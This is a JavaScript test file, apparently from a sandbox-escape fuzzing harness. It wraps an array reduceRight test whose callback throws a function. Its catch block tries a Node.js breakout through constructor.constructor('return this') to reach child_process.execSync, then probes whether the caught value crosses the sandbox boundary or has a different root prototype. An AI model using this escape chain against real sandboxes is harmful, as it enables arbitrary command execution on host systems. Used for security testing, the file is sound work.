try {
    var arr = [
        11,
        12,
        13,
        14
    ];
    var kIndex = [];
    var result = true;
    var called = 0;
    function callbackfn(preVal, curVal, idx, o) {
        throw () => {
            return () => {
            };
        };
        called++;
        if (typeof kIndex[idx] === 'undefined') {
            if (idx !== arr.length - 1 && typeof kIndex[idx + 1] === 'undefined') {
                result = false;
            }
            kIndex[idx] = 1;
        } else {
            result = false;
        }
    }
    arr.reduceRight(callbackfn, 1);
    assert(result, 'result !== true');
    assert.sameValue(called, 4, 'called');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}